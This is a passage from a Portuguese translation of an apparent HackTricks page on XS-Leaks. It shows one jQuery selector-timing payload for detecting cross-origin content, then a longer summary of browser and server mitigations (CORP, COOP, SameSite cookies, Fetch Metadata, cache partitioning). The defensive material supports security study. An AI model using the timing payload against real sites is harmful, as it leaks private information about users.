Se `jQuery(location.hash)` for usado, √© poss√≠vel descobrir atrav√©s do tempo **se algum conte√∫do HTML existe**, isso porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o √© necess√°rio verificar o resto dos **seletores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inje√ß√£o de CSS

{% content-ref url="xs-search/css-injection/" %}
[inje√ß√£o de css](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Nesta se√ß√£o, voc√™ pode encontrar parte das mitiga√ß√µes recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), no entanto, existem mais mitiga√ß√µes em cada se√ß√£o da wiki [https://xsleaks.dev/](https://xsleaks.dev/). Visite para mais informa√ß√µes sobre como se proteger contra essas t√©cnicas.

### Mitiga√ß√µes do M√©todo de Inclus√£o

* **Elementos HTML**. Podem usar o **cabe√ßalho CORP para controlar se p√°ginas podem incorporar um recurso**. CORP pode ser configurado como same-origin ou same-site e bloqueia quaisquer solicita√ß√µes cross-origin ou cross-site para esse recurso. No **lado do cliente**, navegadores baseados em Chromium usam o algoritmo **CORB** para decidir se solicita√ß√µes de recursos cross-origin devem ser permitidas ou negadas.
* **Frames**. A principal defesa para **prevenir elementos iframe** de carregar recursos HTML √© o uso de **X-Frame-Options**. Alternativamente, a **diretiva CSP frame-ancestors** pode alcan√ßar um resultado similar. Se a incorpora√ß√£o for negada, o m√©todo de inclus√£o n√£o pode detectar uma diferen√ßa nas respostas.
* **Pop-ups**. Para restringir o acesso a `window.opener`, o **cabe√ßalho de resposta HTTP COOP** define tr√™s valores diferentes: unsafe-none (padr√£o), same-origin-allow-popups e same-origin. Esses valores podem ser usados para **isolar abas de navega√ß√£o e pop-ups** e, assim, mitigar t√©cnicas de vazamento baseadas em pop-ups.
* **Solicita√ß√µes JavaScript**. Solicita√ß√µes JavaScript cross-origin s√£o frequentemente usadas em ataques XS-Leak, porque um atacante tem controle preciso sobre a solicita√ß√£o emitida. No entanto, como essas solicita√ß√µes n√£o s√£o habilitadas para CORS, elas est√£o sujeitas √†s mesmas restri√ß√µes que solicita√ß√µes enviadas por elementos HTML, como scripts ou imagens. Assim, o impacto desta t√©cnica de vazamento tamb√©m pode ser **mitigado por CORP e CORB**.

M√©todos mais gen√©ricos:

* **Metadados de Fetch**. Esses cabe√ßalhos de solicita√ß√£o permitem que os propriet√°rios de servidores entendam melhor como o navegador do usu√°rio causou uma solicita√ß√£o espec√≠fica. No Chrome, cabe√ßalhos Sec-Fetch-\* s√£o automaticamente adicionados a cada solicita√ß√£o e fornecem metadados sobre a proveni√™ncia da solicita√ß√£o. Por exemplo, Sec-Fetch-Dest: image foi acionado a partir de um elemento de imagem. Aplica√ß√µes web podem ent√£o escolher bloquear solicita√ß√µes com base nessas informa√ß√µes.
* **Cookies Same-Site**. A flag de cookie Same-Site permite que sites declarem **se um cookie deve ser restrito a um contexto same-site ou firstparty**. Todos os principais navegadores suportam cookies Same-Site. No GC, cookies sem o atributo s√£o agora Lax por padr√£o. Para XS-Leaks, **cookies Same-Site limitam drasticamente as possibilidades de ataque de vazamento**. Por outro lado, t√©cnicas de vazamento que dependem de **`window.open` ainda funcionam com `SameSite=Lax`**. Sites que usam **outros m√©todos de autentica√ß√£o**, como certificados do lado do cliente e autentica√ß√£o HTTP, **permanecem vulner√°veis**.
* **Desvincula√ß√£o de Identificador Cross-Origin (COIU)**. COIU, tamb√©m conhecido como Isolamento de Primeira Parte (FPI), √© um recurso de seguran√ßa opcional que os usu√°rios podem habilitar nas configura√ß√µes avan√ßadas do FF (about:config) e foi inicialmente introduzido no Tor Browser. De forma abstrata, √© um contexto same-site estendido. Ele **vincula m√∫ltiplos recursos** (por exemplo, Cookies, Cache, Armazenamentos do lado do cliente) **√† primeira parte** em vez de compartilh√°-los entre todos os sites visitados. Se habilitado, o COIU diminui drasticamente a aplicabilidade de XS-Leaks, j√° que apenas m√©todos que usam pop-ups ainda s√£o poss√≠veis para atender ao requisito de primeira parte da pol√≠tica.
* **Prote√ß√µes de Rastreamento**. A Apple implementou um mecanismo de privacidade chamado **Preven√ß√£o Inteligente de Rastreamento (ITP)** no SA que visa combater o rastreamento cross-site limitando as capacidades de cookies e outras APIs web. Em vers√µes mais recentes do SA, o ITP bloqueia todos os cookies de terceiros por padr√£o sem exce√ß√µes \[74]. Esse bloqueio impede todos os vazamentos que n√£o s√£o baseados em pop-ups. O FF adotou uma abordagem semelhante com a Preven√ß√£o Aprimorada de Rastreamento (ETP), mas eles s√≥ bloqueiam cookies de terceiros espec√≠ficos pertencentes a provedores de rastreamento. No contexto de XS-Leaks, o ETP s√≥ mitiga t√©cnicas de vazamento que visam esses dom√≠nios de rastreamento.
* **Extens√µes de Navegador**. Usu√°rios conscientes de seguran√ßa podem usar **extens√µes de navegador para prevenir certos m√©todos de inclus√£o**.

### Mitiga√ß√µes de T√©cnicas de Vazamento

* **Manipulador de Eventos**. A **mitiga√ß√£o mais eficaz** para esta t√©cnica de vazamento seria **neg√°-las todas**, mas isso quebraria a maioria das aplica√ß√µes web na Internet. Portanto, propomos **reduzir o n√∫mero de informa√ß√µes necess√°rias que podem ser coletadas dentro de eventos**. Por exemplo, o evento de viola√ß√£o do CSP n√£o deve conter a URL de redirecionamento alvo no campo blockedURI. Esse comportamento √© implementado no FF e em vers√µes mais recentes do GC ‚Äì apenas o SA permanece vulner√°vel.
* **Mensagens de Erro**. Para mitigar XS-Leaks baseados na t√©cnica de vazamento de mensagens de erro, h√° dois requisitos principais. Primeiro, **mensagens de erro n√£o devem conter informa√ß√µes detalhadas**, de forma semelhante √†s mensagens de manipulador de eventos. Segundo, os navegadores devem **minimizar a ocorr√™ncia de mensagens de erro**. XS-Leaks como Erro SRI, ContentDocument XFO ou Fetch Redirect detectam se uma mensagem de erro √© lan√ßada ou n√£o.
* **Limites Globais**. Corrigir t√©cnicas de vazamento que abusam de limites globais √© relativamente complexo porque dependem de restri√ß√µes f√≠sicas. A recomenda√ß√£o geral √© **restringir limites globais em uma pequena base por site**. Se o limite global for 1, como para a API de Pagamento, o atacante pode tentar ativar silenciosamente a UI de WebPayment a qualquer momento, o que s√≥ tem sucesso se a UI n√£o estiver sendo usada simultaneamente por outra aba. Recomendamos acessar a API de Pagamento apenas quando um evento confi√°vel for usado. Dessa forma, o limite global √© definido como zero a menos que o usu√°rio forne√ßa consentimento, como um clique com o bot√£o esquerdo do mouse em uma janela de di√°logo, que define o limite global para um.
* **Estado Global**. Quaisquer **propriedades do estado global de um navegador n√£o devem ser acess√≠veis**. Por exemplo, o FF √© o √∫nico navegador que atualiza o estado global do hist√≥rico quando ocorre um redirecionamento, o que resulta na leitura de history.length. Navegadores devem criar uma nova propriedade de hist√≥rico quando ocorrer um redirecionamento em vez de armazen√°-la globalmente. Outros exemplos s√£o recursos compartilhados, como caches. Vazamentos de cache abusam do cache compartilhado usado para todos os sites abertos em um navegador. Para mitigar completamente as t√©cnicas de vazamento de cache, o cache HTTP deve ser particionado em uma base por site, como implementado por SA, GC e FF. Note que no SA iframes n√£o s√£o afetados pela parti√ß√£o de cache.
* **API de Desempenho**. Provamos que a API de Desempenho √© uma excelente t√©cnica de vazamento. Em muitos XS-Leaks, pudemos detectar a diferen√ßa se a resposta de uma solicita√ß√£o cross-origin tem ou n√£o uma entrada de desempenho. Como unifica√ß√£o, recomendamos garantir que todas as solicita√ß√µes criem tal entrada e apenas o subconjunto correto de informa√ß√µes de tempo seja registrado para solicita√ß√µes cross-origin.

## Refer√™ncias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga** me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
